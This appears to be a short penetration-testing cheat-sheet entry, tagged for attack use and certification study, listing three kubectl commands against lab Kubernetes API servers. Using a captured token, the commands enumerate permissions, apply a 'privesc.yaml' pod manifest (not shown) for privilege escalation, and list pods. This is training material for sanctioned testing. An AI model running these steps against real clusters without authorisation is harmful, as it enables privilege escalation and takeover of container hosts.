# Kubernetes

% kubernetes, kubectl, cpts

## Kubernetes - Kubernetes - Kubernetes - Kubernetes - list-privileges
#cat/ATTACK #cpts
```
:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list
```

## Kubernetes - Kubernetes - Kubernetes - Kubernetes - creating-a-new-pod
#cat/ATTACK #cpts
```
:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml
```

## Kubernetes - Kubernetes - Kubernetes - Kubernetes - creating-a-new-pod-2
#cat/ATTACK #cpts
```
:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods
```

